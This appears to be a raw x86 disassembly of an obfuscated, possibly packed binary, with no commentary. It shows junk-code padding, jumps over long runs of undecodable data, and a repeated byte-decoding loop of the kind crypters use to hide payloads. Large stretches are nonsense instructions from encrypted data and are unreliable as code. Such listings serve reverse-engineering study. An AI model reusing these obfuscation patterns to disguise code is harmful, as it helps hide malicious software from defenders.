  41629d:	xor    ecx,ebx
  41629f:	xor    eax,edi
  4162a1:	shl    ecx,0x1e
  4162a4:	shr    eax,0x2
  4162a7:	or     ecx,eax
  4162a9:	push   ecx
  4162aa:	lea    eax,[ebp-0x20]
  4162ad:	push   eax
  4162ae:	mov    eax,DWORD PTR [ebp+0x10]
  4162b1:	mov    ecx,DWORD PTR [ebp+0x14]
  4162b4:	shrd   eax,ecx,0x2
  4162b8:	shr    ecx,0x2
  4162bb:	mov    ecx,DWORD PTR [ebp+0x10]
  4162be:	mov    edx,DWORD PTR [ebp+0x14]
  4162c1:	xor    edx,edx
  4162c3:	xor    eax,esi
  4162c5:	or     eax,edx
  4162c7:	shl    ecx,0x1e
  4162ca:	mov    ecx,DWORD PTR [ebp+0x10]
  4162cd:	mov    edx,DWORD PTR [ebp+0x14]
  4162d0:	shrd   ecx,edx,0x2
  4162d4:	shr    edx,0x2
  4162d7:	mov    edx,DWORD PTR [ebp+0x10]
  4162da:	mov    ebx,DWORD PTR [ebp+0x14]
  4162dd:	xor    ecx,esi
  4162df:	xor    ebx,ebx
  4162e1:	or     ecx,ebx
  4162e3:	add    eax,ecx
  4162e5:	lea    eax,[ebp+eax*4-0x78]
  4162e9:	push   eax
  4162ea:	shl    edx,0x1e
  4162ed:	call   0x415231
  4162f2:	mov    eax,DWORD PTR [ebp-0x8]
  4162f5:	mov    ecx,DWORD PTR [ebp-0x8]
  4162f8:	xor    ecx,0xfffffffe
  4162fb:	shl    ecx,0x1e
  4162fe:	jmp    0x41655e
  416303:	sbb    eax,0x26add60b
  416308:	lods   eax,DWORD PTR ds:[esi]
  416309:	sbb    bh,BYTE PTR [edx-0x45]
  41630c:	xor    bl,BYTE PTR [ebx+0x70]
  41630f:	call   0x1600:0xf46a39f8
  416316:	sbb    BYTE PTR [ebx+0x77181814],bl
  41631c:	pusha  
  41631d:	mov    WORD PTR [esi],fs
  41631f:	xor    ebx,DWORD PTR [ecx]
  416321:	icebp  
  416322:	xchg   edi,eax
  416323:	jmp    0x416316
  416325:	(bad)  
  416326:	cmc    
  416327:	push   esi
  416328:	pop    esi
  416329:	mov    ah,0xa3
  41632b:	sbb    al,0x8c
  41632d:	cmp    ecx,DWORD PTR [edx+0x71]
  416330:	push   eax
  416331:	jg     0x4162b7
  416333:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  416335:	mov    bl,0xa0
  416337:	aam    0x8b
  416339:	push   esi
  41633a:	ins    DWORD PTR es:[edi],dx
  41633b:	jg     0x416318
  41633d:	xor    eax,0x5d7cebff
  416342:	iret   
  416343:	xchg   ebx,eax
  416344:	cmp    dl,BYTE PTR [eax-0x5cab8bba]
  41634a:	and    esp,ebx
  41634c:	sar    dl,cl
  41634e:	add    dh,BYTE PTR [ecx+0x70e8a67c]
  416354:	dec    eax
  416355:	test   DWORD PTR [ebx-0x31],ecx
  416358:	jae    0x41638e
  41635a:	ds bound eax,QWORD PTR gs:[edi+0x2a5fe2a2]
  416362:	fdiv   QWORD PTR [edi+0x39bf8944]
  416368:	shr    DWORD PTR [esi-0x21],1
  41636b:	add    DWORD PTR [esi-0x76b460b6],esi
  416371:	dec    ebp
  416372:	jbe    0x416303
  416374:	push   esi
  416375:	lds    esi,FWORD PTR [eax]
  416377:	gs push esi
  416379:	mov    BYTE PTR [edx+ebx*8+0x6f],dl
  41637d:	sar    BYTE PTR [edi+esi*8-0x59],0x67
  416382:	cmp    cl,BYTE PTR [esp+ecx*1-0x52b84865]
  416389:	sahf   
  41638a:	lods   eax,DWORD PTR ds:[esi]
  41638b:	sbb    al,BYTE PTR [ecx+0x7420c5ba]
  416391:	push   0xffffffd8
  416393:	ror    DWORD PTR [eax+0x3a],cl
  416396:	inc    edi
  416397:	push   edi
  416398:	adc    al,0xf1
  41639a:	push   es
  41639b:	push   es
  41639c:	mov    ds:0xa1259425,eax
  4163a1:	dec    esi
  4163a2:	test   BYTE PTR [edi-0x2e],bh
  4163a5:	cld    
  4163a6:	aas    
  4163a7:	push   edi
  4163a8:	popf   
  4163a9:	push   es
  4163aa:	int3   
  4163ab:	push   cs
  4163ac:	mov    esp,0x74c121f6
  4163b1:	in     eax,0x4e
  4163b3:	push   edi
  4163b4:	lock or ah,BYTE PTR [edx+0x57d712e7]
  4163bb:	or     DWORD PTR [eax+0x79988740],esi
  4163c1:	inc    ebx
  4163c2:	into   
  4163c3:	mov    ds:0xc7d87384,al
  4163c8:	jp     0x416373
  4163ca:	stc    
  4163cb:	add    ebp,ebp
  4163cd:	xchg   BYTE PTR [eax-0x3bdcb2e1],dh
  4163d3:	pop    edi
  4163d4:	ins    BYTE PTR es:[edi],dx
  4163d5:	mov    ebp,0x9ee69b2f
  4163da:	jne    0x41639b
  4163dc:	clc    
  4163dd:	xor    eax,0x69eaa65e
  4163e2:	cmp    DWORD PTR [esi+0x3fd29053],edi
  4163e8:	ret    0x80a6
  4163eb:	daa    
  4163ec:	imul   edi,esi,0xffffff94
  4163ef:	aaa    
  4163f0:	pushf  
  4163f1:	adc    bl,ch
  4163f3:	lods   al,BYTE PTR ds:[esi]
  4163f4:	push   0x595248e
  4163f9:	mov    edx,0x1dcf1443
  4163fe:	scas   eax,DWORD PTR es:[edi]
  4163ff:	mov    ss,WORD PTR [eax]
  416401:	xchg   ebx,eax
  416402:	cmp    DWORD PTR [esi],esi
  416404:	and    ebp,edx
  416406:	les    esp,FWORD PTR [edx-0x47]
  416409:	out    0x1c,eax
  41640b:	adc    al,0x8c
  41640d:	cld    
  41640e:	and    eax,0xfa0ca718
  416413:	mov    ah,0x2
  416415:	jge    0x416487
  416417:	or     eax,0x971560c8
  41641c:	push   0x9e89998a
  416421:	stos   DWORD PTR es:[edi],eax
  416422:	push   edi
  416423:	jl     0x4163cc
  416425:	jl     0x416421
  416427:	ss hlt 
  416429:	adc    al,0x99
  41642b:	dec    edx
  41642c:	cmp    cl,ah
  41642e:	gs repz push edx
  416431:	cmp    ebx,DWORD PTR [eax]
  416433:	push   0x499c3eaa
  416438:	mov    edx,0xe9032e60
  41643d:	sub    cl,BYTE PTR [ecx]
  41643f:	std    
  416440:	popf   
  416441:	in     al,0x49
  416443:	retf   0x2312
  416446:	xchg   esi,eax
  416447:	xor    dl,BYTE PTR [eax]
  416449:	rcr    edi,0xe9
  41644c:	pop    ds
  41644d:	shr    esp,0xe0
  416450:	scas   al,BYTE PTR es:[edi]
  416451:	hlt    
  416452:	or     bl,BYTE PTR [ecx+0x47eb33fe]
  416458:	pop    ebp
  416459:	sar    bh,1
  41645b:	push   0xffffffe0
  41645d:	jg     0x416433
  41645f:	out    dx,eax
  416460:	cmp    dl,BYTE PTR [eax]
  416462:	sbb    BYTE PTR [edx],0x47
  416465:	fwait
  416466:	jle    0x4164a7
  416468:	jmp    0xc5296520
  41646d:	dec    ebx
  41646e:	test   ecx,eax
  416470:	or     al,0x2
  416472:	jno    0x416493
  416474:	test   eax,0x58f2035f
  416479:	(bad)  
  41647a:	xchg   ebx,eax
  41647b:	ret    
  41647c:	jmp    0x416464
  41647e:	int3   
  41647f:	inc    edx
  416480:	out    dx,al
  416481:	in     al,dx
  416482:	jle    0x4164fc
  416484:	xor    eax,DWORD PTR [edx+0x48]
  416487:	dec    esi
  416488:	xchg   DWORD PTR [ebx-0x5f90e57a],eax
  41648e:	cmc    
  41648f:	cld    
  416490:	or     ecx,edi
  416492:	pop    esi
  416493:	jbe    0x41644a
  416495:	rcr    BYTE PTR [esi],0x46
  416498:	xor    al,0xc0
  41649a:	push   ebx
  41649b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41649c:	retf   0x6aa1
  41649f:	xor    BYTE PTR [edi-0x3a6563f8],0x2d
  4164a6:	xlat   BYTE PTR ds:[ebx]
  4164a7:	ret    0xd98a
  4164aa:	sbb    al,0x10
  4164ac:	cmp    al,0xbd
  4164ae:	aad    0xc
  4164b0:	mov    eax,ds:0xabad6404
  4164b5:	add    eax,0xb5bf8a18
  4164ba:	ins    BYTE PTR es:[edi],dx
  4164bb:	mov    ds:0x60267085,eax
  4164c0:	std    
  4164c1:	pop    ds
  4164c2:	sahf   
  4164c3:	xchg   ecx,eax
  4164c4:	inc    esi
  4164c5:	lods   eax,DWORD PTR ds:[esi]
  4164c6:	shl    BYTE PTR [esi],cl
  4164c8:	cwde   
  4164c9:	(bad)  
  4164ca:	sbb    al,0x61
  4164cc:	mov    bh,0xce
  4164ce:	push   edi
  4164cf:	out    dx,eax
  4164d0:	in     eax,dx
  4164d1:	inc    esp
  4164d2:	mov    bl,0xbc
  4164d4:	inc    ebp
  4164d5:	or     al,0x31
  4164d7:	cdq    
  4164d8:	sub    al,0xa1
  4164da:	or     ch,BYTE PTR [ecx+0x5]
  4164dd:	sbb    ebp,DWORD PTR [ebx+0x76b2c3b3]
  4164e3:	pop    ss
  4164e4:	dec    edi
  4164e5:	pop    edx
  4164e6:	loope  0x416508
  4164e8:	cmp    eax,0x49e07ffd
  4164ed:	es inc esi
  4164ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164f0:	lods   eax,DWORD PTR ds:[esi]
  4164f1:	jae    0x416479
  4164f3:	mov    BYTE PTR [ecx-0x374be353],0x9a
  4164fa:	ret    
  4164fb:	out    dx,al
  4164fc:	xor    dl,ch
  4164fe:	mov    ch,0x22
  416500:	sub    ebx,DWORD PTR [edx]
  416502:	mov    al,ds:0xb2f470bf
  416507:	and    esp,edi
  416509:	sub    ecx,DWORD PTR [edx+0x5915028a]
  41650f:	pop    edi
  416510:	repnz bound esp,QWORD PTR [edi+0x9]
  416514:	fist   WORD PTR [ebp-0x334f343d]
  41651a:	lock out 0x82,eax
  41651d:	add    ebp,DWORD PTR [esp+ecx*2]
  416520:	fcom   QWORD PTR [ebx+eiz*4-0x57]
  416524:	(bad)  
  416525:	jns    0x4164e5
  416527:	jmp    0x4164d2
  416529:	cld    
  41652a:	das    
  41652b:	hlt    
  41652c:	and    eax,0x3eaf46ca
  416531:	sub    edi,ebp
  416533:	mov    edi,0x82e8797d
  416538:	(bad)  
  41653a:	aad    0x0
  41653c:	les    ebp,FWORD PTR [edi+0x16]
  41653f:	enter  0xad87,0xf4
  416543:	fidiv  DWORD PTR [esi-0x53]
  416546:	mov    eax,0x6377a294
  41654b:	jns    0x416585
  41654d:	data16 loopne 0x416527
  416550:	cmp    eax,0x27224470
  416555:	xchg   esp,eax
  416556:	fild   DWORD PTR [ebp-0xb]
  416559:	pop    ecx
  41655a:	bound  edi,QWORD PTR [ebx]
  41655c:	push   0x60
  41655e:	xor    eax,edi
  416560:	shr    eax,0x2
  416563:	or     ecx,eax
  416565:	push   ecx
  416566:	lea    eax,[ebp-0x2c]
  416569:	push   eax
  41656a:	mov    eax,DWORD PTR [ebp+0x10]
  41656d:	mov    ecx,DWORD PTR [ebp+0x14]
  416570:	shrd   eax,ecx,0x2
  416574:	shr    ecx,0x2
  416577:	mov    ecx,DWORD PTR [ebp+0x10]
  41657a:	mov    edx,DWORD PTR [ebp+0x14]
  41657d:	xor    edx,edx
  41657f:	shl    ecx,0x1e
  416582:	mov    ecx,DWORD PTR [ebp+0x10]
  416585:	xor    eax,esi
  416587:	or     eax,edx
  416589:	mov    edx,DWORD PTR [ebp+0x14]
  41658c:	shrd   ecx,edx,0x2
  416590:	shr    edx,0x2
  416593:	mov    edx,DWORD PTR [ebp+0x10]
  416596:	mov    ebx,DWORD PTR [ebp+0x14]
  416599:	xor    ecx,esi
  41659b:	xor    ebx,ebx
  41659d:	or     ecx,ebx
  41659f:	shl    edx,0x1e
  4165a2:	add    eax,ecx
  4165a4:	mov    ecx,DWORD PTR [ebp+0x10]
  4165a7:	mov    edx,DWORD PTR [ebp+0x14]
  4165aa:	shrd   ecx,edx,0x2
  4165ae:	shr    edx,0x2
  4165b1:	xor    ecx,esi
  4165b3:	mov    edx,DWORD PTR [ebp+0x10]
  4165b6:	mov    ebx,DWORD PTR [ebp+0x14]
  4165b9:	xor    ebx,ebx
  4165bb:	or     ecx,ebx
  4165bd:	add    eax,ecx
  4165bf:	lea    eax,[ebp+eax*4-0x78]
  4165c3:	push   eax
  4165c4:	shl    edx,0x1e
  4165c7:	call   0x415231
  4165cc:	mov    eax,DWORD PTR [ebp-0x7c]
  4165cf:	mov    ecx,DWORD PTR [ebp-0x7c]
  4165d2:	xor    eax,edi
  4165d4:	xor    ecx,0xfffffffe
  4165d7:	shr    eax,0x2
  4165da:	shl    ecx,0x1e
  4165dd:	or     ecx,eax
  4165df:	mov    DWORD PTR [ebp-0x7c],ecx
  4165e2:	lea    eax,[ebp-0x7c]
  4165e5:	push   eax
  4165e6:	mov    eax,DWORD PTR [ebp+0x10]
  4165e9:	mov    ecx,DWORD PTR [ebp+0x14]
  4165ec:	shrd   eax,ecx,0x2
  4165f0:	shr    ecx,0x2
  4165f3:	mov    ecx,DWORD PTR [ebp+0x10]
  4165f6:	mov    edx,DWORD PTR [ebp+0x14]
  4165f9:	xor    eax,esi
  4165fb:	xor    edx,edx
  4165fd:	or     eax,edx
  4165ff:	push   eax
  416600:	mov    eax,ds:0x422548
  416605:	mov    edi,0x42248e
  41660a:	push   edi
  41660b:	push   DWORD PTR [eax]
  41660d:	shl    ecx,0x1e
  416610:	call   0x41e9f9
  416615:	lea    eax,[ebp-0x7c]
  416618:	push   eax
  416619:	mov    eax,DWORD PTR [ebp+0x10]
  41661c:	mov    ecx,DWORD PTR [ebp+0x14]
  41661f:	shrd   eax,ecx,0x2
  416623:	shr    ecx,0x2
  416626:	mov    ecx,DWORD PTR [ebp+0x10]
  416629:	mov    edx,DWORD PTR [ebp+0x14]
  41662c:	xor    eax,esi
  41662e:	xor    edx,edx
  416630:	or     eax,edx
  416632:	push   eax
  416633:	mov    eax,ds:0x422548
  416638:	push   edi
  416639:	push   DWORD PTR [eax]
  41663b:	shl    ecx,0x1e
  41663e:	call   0x41e9f9
  416643:	mov    eax,DWORD PTR [ebp-0x30]
  416646:	mov    eax,DWORD PTR [ebp-0x20]
  416649:	mov    edi,DWORD PTR [ebp-0x14]
  41664c:	mov    eax,DWORD PTR [ebp-0x24]
  41664f:	mov    ecx,edi
  416651:	mov    DWORD PTR [ebp-0x1c],eax
  416654:	rol    ecx,0x2
  416657:	mov    eax,0xa4069aae
  41665c:	xor    ecx,eax
  41665e:	cmp    ecx,eax
  416660:	je     0x416bfd
  416666:	mov    edx,0x1001
  41666b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41666e:	xor    eax,eax
  416670:	test   ecx,ecx
  416672:	je     0x41669d
  416678:	mov    bl,BYTE PTR [eax+edi*1]
  41667b:	mov    BYTE PTR [ebp-0x1],bl
  41667e:	movzx  ebx,BYTE PTR [ebp-0x1]
  416682:	sub    ebx,0xec
  416688:	mov    BYTE PTR [ebp-0x1],bl
  41668b:	ror    BYTE PTR [ebp-0x1],1
  41668e:	mov    bl,BYTE PTR [ebp-0x1]
  416691:	mov    BYTE PTR [eax+edi*1],bl
  416694:	inc    eax
  416695:	cmp    eax,ecx
  416697:	jb     0x416678
  41669d:	dec    edx
  41669e:	jne    0x41666b
  4166a4:	mov    eax,DWORD PTR [ebp+0x8]
  4166a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4166aa:	shrd   eax,ecx,0x2
  4166ae:	shr    ecx,0x2
  4166b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4166b4:	mov    edx,DWORD PTR [ebp+0xc]
  4166b7:	xor    eax,esi
  4166b9:	xor    edx,edx
  4166bb:	or     eax,edx
  4166bd:	push   0x1
  4166bf:	add    eax,edi
  4166c1:	push   eax
  4166c2:	lea    eax,[ebp-0x2]
  4166c5:	push   eax
  4166c6:	shl    ecx,0x1e
  4166c9:	call   0x415231
  4166ce:	mov    eax,DWORD PTR [ebp+0x10]
  4166d1:	mov    ecx,DWORD PTR [ebp+0x14]
  4166d4:	shrd   eax,ecx,0x2
  4166d8:	shr    ecx,0x2
  4166db:	mov    ecx,DWORD PTR [ebp+0x10]
  4166de:	mov    edx,DWORD PTR [ebp+0x14]
  4166e1:	xor    eax,esi
  4166e3:	xor    edx,edx
  4166e5:	or     eax,edx
  4166e7:	add    eax,edi
  4166e9:	push   0x1
  4166eb:	push   eax
  4166ec:	mov    eax,DWORD PTR [ebp+0x8]
  4166ef:	shl    ecx,0x1e
  4166f2:	mov    ecx,DWORD PTR [ebp+0xc]
  4166f5:	shrd   eax,ecx,0x2
  4166f9:	shr    ecx,0x2
  4166fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4166ff:	mov    edx,DWORD PTR [ebp+0xc]
  416702:	xor    eax,esi
  416704:	xor    edx,edx
  416706:	or     eax,edx
  416708:	add    eax,edi
  41670a:	push   eax
  41670b:	shl    ecx,0x1e
  41670e:	call   0x415231
  416713:	push   0x1
  416715:	jmp    0x416975
  41671a:	out    dx,eax
  41671b:	(bad)
  41671f:	mov    dl,0x2a
  416721:	dec    esi
  416722:	xchg   ebx,eax
  416723:	fistp  WORD PTR [ebp+0x59e26070]
  416729:	stos   BYTE PTR es:[edi],al
  41672a:	ja     0x416728
  41672c:	push   ss
  41672d:	sbb    BYTE PTR [ebx+0x60181814],bl
  416733:	adc    DWORD PTR ss:[edi],esp
  416736:	cli    
  416737:	fbld   TBYTE PTR [edi+0x37]
  41673a:	adc    eax,0x37a08956
  41673f:	adc    esi,ecx
  416741:	mov    esp,0xcc268665
  416746:	jbe    0x416773
  416748:	add    al,0x15
  41674a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41674b:	pusha  
  41674c:	pop    esi
  41674d:	fistp  QWORD PTR [ebp+0x7aefa1a]
  416753:	loop   0x416725
  416755:	dec    ebp
  416756:	mov    ebp,cs
  416758:	jg     0x416792
  41675a:	xchg   ebx,eax
  41675b:	ins    BYTE PTR es:[edi],dx
  41675c:	popf   
  41675d:	sbb    eax,0xddd40cb3
  416762:	and    cl,BYTE PTR [ecx+0x48d20448]
  416768:	mov    dl,0x46
  41676a:	cmp    ecx,DWORD PTR ds:0x60964116
  416770:	dec    ecx
  416771:	(bad)  
  416772:	iret   
  416773:	cmc    
  416774:	mov    DWORD PTR [ebx+0x3c],esi
  416777:	aaa    
  416778:	jns    0x4167c6
  41677a:	jb     0x41675f
  41677c:	icebp  
  41677d:	ret    
  41677e:	(bad)  
  41677f:	popa   
  416780:	dec    esi
  416781:	ins    BYTE PTR es:[edi],dx
  416782:	lods   al,BYTE PTR ds:[esi]
  416783:	and    al,0x80
  416785:	mov    DWORD PTR cs:0x1c0d839c,0x4e5e6054
  416790:	shr    BYTE PTR [edi],0x94
  416793:	cli    
  416794:	inc    ecx
  416795:	outs   dx,DWORD PTR ds:[esi]
  416796:	mov    ds:0x53c93999,al
  41679b:	mov    esi,0xb0c42c50
  4167a0:	lahf   
  4167a1:	fldenv [ecx+0x5ef7d456]
  4167a7:	mov    DWORD PTR [ecx-0x39],ecx
  4167aa:	jge    0x41682b
  4167ac:	adc    ch,al
  4167ae:	mov    al,0xa8
  4167b0:	leave  
  4167b1:	not    DWORD PTR [ecx]
  4167b3:	jl     0x4167dd
  4167b5:	jae    0x416827
  4167b7:	ret    
  4167b8:	sbb    DWORD PTR [ebx+0x1e],ebx
  4167bb:	sub    edi,DWORD PTR [bp+di-0x5ff6]
  4167c0:	mov    dl,0xe6
  4167c2:	xchg   ebp,eax
  4167c3:	push   0xffffff97
  4167c5:	jae    0x4167f4
  4167c7:	jno    0x4167d5
  4167c9:	fwait
  4167ca:	mov    edi,0x70c703c1
  4167cf:	and    DWORD PTR [eax],ebx
  4167d1:	fsub   DWORD PTR [esi-0x6516ef17]
  4167d7:	aaa    
  4167d8:	fsub   QWORD PTR [ebx]
  4167da:	or     edx,ebx
  4167dc:	or     dh,dl
  4167de:	repz cmp dl,cl
  4167e1:	xchg   ebp,eax
  4167e2:	pop    esp
  4167e3:	jg     0x41682d
  4167e5:	push   ds
  4167e6:	scas   al,BYTE PTR es:[edi]
  4167e7:	imul   eax,DWORD PTR [ecx+0x4d],0xffc89f17
  4167ee:	outs   dx,BYTE PTR ds:[esi]
  4167ef:	pop    ecx
  4167f0:	jp     0x4167d9
  4167f2:	add    bl,dl
  4167f4:	inc    esp
  4167f5:	mov    eax,esi
  4167f7:	xchg   edi,eax
  4167f8:	mov    ch,0xbe
  4167fa:	mov    esp,0x10350736
  4167ff:	add    ch,BYTE PTR [ebx+0x2a9788bb]
  416805:	xor    DWORD PTR [ebx],esp
  416807:	dec    ecx
  416808:	mov    ds:0xaabe721,eax
  41680d:	pusha  
  41680e:	pop    es
  41680f:	pop    edx
  416810:	pop    ebx
  416811:	(bad)  
  416812:	ror    DWORD PTR [ebx-0x4f],cl
  416815:	mov    cl,bl
  416817:	(bad)  
  416818:	fisttp DWORD PTR [eax]
  41681a:	je     0x41681e
  41681c:	mov    dh,0xa8
  41681e:	inc    ebx
  41681f:	je     0x416835
  416821:	test   BYTE PTR [edx+0x448fb236],0xcf
  416828:	dec    edi
  416829:	ret    
  41682a:	mov    ds:0xf0bfee1f,eax
  41682f:	jmp    0x41684d
  416831:	or     esi,DWORD PTR [ebp+0x7c]
  416834:	xchg   esp,eax
  416835:	call   0x8e36b864
  41683a:	push   esi
  41683b:	add    al,0x7d
  41683d:	and    BYTE PTR [edx],bl
  41683f:	sbb    eax,0x84f46155
  416844:	(bad)  
  416845:	pop    edx
  416846:	xor    DWORD PTR [esi+0x46],eax
  416849:	fistp  DWORD PTR [eax-0x76]
  41684c:	mov    ebp,0xa61749db
  416851:	nop
  416852:	cmp    eax,0xbaa9f71e
  416857:	jnp    0x4167fd
  416859:	mov    al,0x1b
  41685b:	dec    esp
  41685c:	repnz xchg esi,edi
  41685f:	out    0x39,al
  416861:	sti    
  416862:	mov    esp,esi
  416864:	addr16 pop ebp
  416866:	lods   al,BYTE PTR ds:[esi]
  416867:	mov    esi,0x845e691b
  41686c:	sbb    al,0x6f
  41686e:	xchg   ebx,eax
  41686f:	stos   BYTE PTR es:[edi],al
  416870:	sbb    DWORD PTR [eax],ebx
  416872:	ret    0xda35
  416875:	fsub   DWORD PTR [edx]
  416877:	and    eax,0xd282c0fd
  41687c:	ret    
  41687d:	xchg   ebp,eax
  41687e:	int    0x50
  416880:	xchg   BYTE PTR [esi],cl
  416882:	push   es
  416883:	sbb    esi,ecx
  416885:	pop    eax
  416886:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416887:	dec    eax
  416888:	fmul   DWORD PTR [eax]
  41688a:	dec    ebp
  41688b:	pop    es
  41688c:	mov    al,ds:0x33da6f41
  416891:	lods   eax,DWORD PTR ds:[esi]
  416892:	outs   dx,DWORD PTR ds:[esi]
  416893:	adc    DWORD PTR [edx+0x52360cfe],ecx
  416899:	(bad)  
  41689a:	push   edi
  41689b:	cmp    ah,BYTE PTR [edx-0x1]
  41689e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41689f:	adc    DWORD PTR [ebp+0xe],esp
  4168a2:	push   esi
  4168a3:	jg     0x416859
  4168a5:	dec    ecx
  4168a6:	repz pop es
  4168a8:	dec    BYTE PTR [eax+0x66c63cb5]
  4168ae:	ret    0x2280
  4168b1:	outs   dx,DWORD PTR ds:[esi]
  4168b2:	push   eax
  4168b3:	out    dx,eax
  4168b4:	(bad)  
  4168b5:	jmp    0x9d43d07
  4168ba:	and    eax,0xb3636ba7
  4168bf:	(bad)
  4168c3:	or     bh,BYTE PTR ds:0x56a46da0
  4168c9:	ret    0x7748
  4168cc:	or     BYTE PTR [edi],bh
  4168ce:	sbb    DWORD PTR [bp+di+0x2784],esp
  4168d3:	iret   
  4168d4:	mov    eax,ds:0x1793ac9a
  4168d9:	out    0x17,eax
  4168db:	jno    0x4168c8
  4168dd:	jo     0x416907
  4168df:	push   0xffffffd3
  4168e1:	fnstcw WORD PTR [esi]
  4168e3:	(bad)  
  4168e4:	aas    
  4168e5:	inc    ecx
  4168e6:	in     eax,0x6d
  4168e8:	lahf   
  4168e9:	xchg   ebp,eax
  4168ea:	adc    ah,BYTE PTR [eax-0x8e435f6]
  4168f0:	sub    ebp,DWORD PTR [eax+0x6a]
  4168f3:	or     dh,BYTE PTR [edi-0x64]
  4168f6:	sbb    DWORD PTR [ebx],edi
  4168f8:	cmp    al,0xeb
  4168fa:	outs   dx,DWORD PTR ds:[esi]
  4168fb:	adc    DWORD PTR [eax+0x2e405ec8],esp
  416901:	pop    esp
  416902:	clc    
  416903:	les    esi,FWORD PTR [ebx]
  416905:	sbb    DWORD PTR [ebx],eax
  416907:	lods   eax,DWORD PTR ds:[esi]
  416908:	pusha  
  416909:	aaa    
  41690a:	adc    eax,0x4bec2b57
  41690f:	lods   eax,DWORD PTR ds:[esi]
  416910:	or     DWORD PTR [edi+0x4fc46f7d],0x7c75e12f
  41691a:	mov    bl,0xcf
  41691c:	addr16 jbe 0x41697b
  41691f:	dec    ebx
  416920:	call   FWORD PTR [ebx-0x1f5b8a12]
  416926:	stos   BYTE PTR es:[edi],al
  416927:	pop    edi
  416928:	jecxz  0x4168b5
  41692a:	xchg   edi,eax
  41692b:	sbb    DWORD PTR [eax],ebp
  41692d:	retf   
  41692e:	cmp    DWORD PTR [ecx],0xca15eafd
  416934:	cmp    bl,dl
  416936:	ret    0x9cda
  416939:	into   
  41693a:	or     eax,0x99f0f087
  41693f:	push   ebp
  416940:	pop    edi
  416941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416942:	repnz dec esp
  416944:	dec    ebx
  416945:	fadd   DWORD PTR fs:[eax+ebp*2]
  416949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41694a:	fdivrp st(6),st
  41694c:	pop    ss
  41694d:	jns    0x41694b
  41694f:	adc    dl,BYTE PTR [eax-0x28c62f50]
  416955:	js     0x416941
  416957:	push   es
  416958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416959:	stos   DWORD PTR es:[edi],eax
  41695a:	aam    0x4a
  41695c:	sub    DWORD PTR [ebx-0x18],edx
  41695f:	std    
  416960:	jle    0x41698c
  416962:	jle    0x4169ba
  416964:	aas    
  416965:	not    DWORD PTR [ebp-0xe8bb953]
  41696b:	and    al,0x7d
  41696d:	or     al,0x56
  41696f:	(bad)  
  416970:	call   0xecbe4a6f
  416975:	lea    eax,[ebp-0x2]
  416978:	push   eax
  416979:	mov    eax,DWORD PTR [ebp+0x10]
  41697c:	mov    ecx,DWORD PTR [ebp+0x14]
  41697f:	shrd   eax,ecx,0x2
  416983:	shr    ecx,0x2
  416986:	mov    ecx,DWORD PTR [ebp+0x10]
  416989:	mov    edx,DWORD PTR [ebp+0x14]
  41698c:	xor    eax,esi
  41698e:	jmp    0x416bee
  416993:	mov    eax,0x2c1e900d
  416998:	sbb    ah,BYTE PTR [esi-0xf757786]
  41699e:	mov    esi,0x6a47c78d
  4169a3:	stc    
  4169a4:	clc    
  4169a5:	push   ss
  4169a6:	sbb    BYTE PTR [ebx-0x51e7e7ec],bl
  4169ac:	mov    ds:0x97b26d4,eax
  4169b1:	mov    dh,0xec
  4169b3:	dec    ecx
  4169b4:	cmc    
  4169b5:	push   edi
  4169b6:	imul   ebx,DWORD PTR [edx],0x3ed53b93
  4169bc:	inc    esi
  4169bd:	clc    
  4169be:	fs inc ebx
  4169c1:	scas   al,BYTE PTR es:[edi]
  4169c2:	mov    esp,0x87aa0a2b
  4169c7:	adc    eax,0x20b29793
  4169cc:	mov    cl,0xbc
  4169ce:	mov    esi,0xa52a0a5e
  4169d3:	ds icebp 
  4169d5:	cmc    
  4169d6:	adc    al,0xb9
  4169d8:	aas    
  4169d9:	mov    eax,0x22a28bc1
  4169de:	scas   al,BYTE PTR es:[edi]
  4169df:	push   ecx
  4169e0:	adc    eax,0xe3327e8a
  4169e5:	mov    DWORD PTR [ecx-0x78],ebx
  4169e8:	push   es
  4169e9:	call   FWORD PTR [edx+0x36]
  4169ec:	std    
  4169ed:	inc    edi
  4169ee:	fwait
  4169ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169f0:	(bad)  [ecx+0x0]
  4169f3:	lods   al,BYTE PTR ds:[esi]
  4169f4:	push   esi
  4169f5:	dec    ebx
  4169f6:	scas   eax,DWORD PTR es:[edi]
  4169f7:	neg    DWORD PTR [ecx+0x233fd122]
  4169fd:	adc    esi,esi
  4169ff:	mov    BYTE PTR [ecx-0xd440b74],ch
  416a05:	sub    edx,eax
  416a07:	mov    ?,WORD PTR [ebx]
  416a09:	gs xchg edi,eax
  416a0b:	mov    edx,0x6ed20229
  416a10:	(bad)  
  416a12:	(bad)  
  416a13:	dec    eax
  416a14:	loopne 0x4169c6
  416a16:	jo     0x41699c
  416a18:	or     al,0x82
  416a1a:	mov    ds:0xe8367f2,eax
  416a1f:	outs   dx,DWORD PTR ds:[esi]
  416a20:	shr    BYTE PTR [edx-0xd11cba0],cl
  416a26:	push   esi
  416a27:	cwde   
  416a28:	inc    ecx
  416a29:	dec    esi
  416a2a:	dec    ecx
  416a2b:	lock jge 0x416a7c
  416a2e:	outs   dx,BYTE PTR ds:[esi]
  416a2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a30:	(bad)  
  416a31:	jl     0x416a8f
  416a33:	pop    ebp
  416a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a35:	bound  esp,QWORD PTR [ebx]
  416a37:	dec    ecx
  416a38:	popf   
  416a39:	add    al,0xed
  416a3b:	repz push edx
  416a3d:	push   eax
  416a3e:	je     0x416a7c
  416a40:	cmp    ebp,edx
  416a42:	std    
  416a43:	add    al,0x10
  416a45:	mov    dh,0xdb
  416a47:	inc    BYTE PTR ds:0xc5fbbad0
  416a4d:	dec    edx
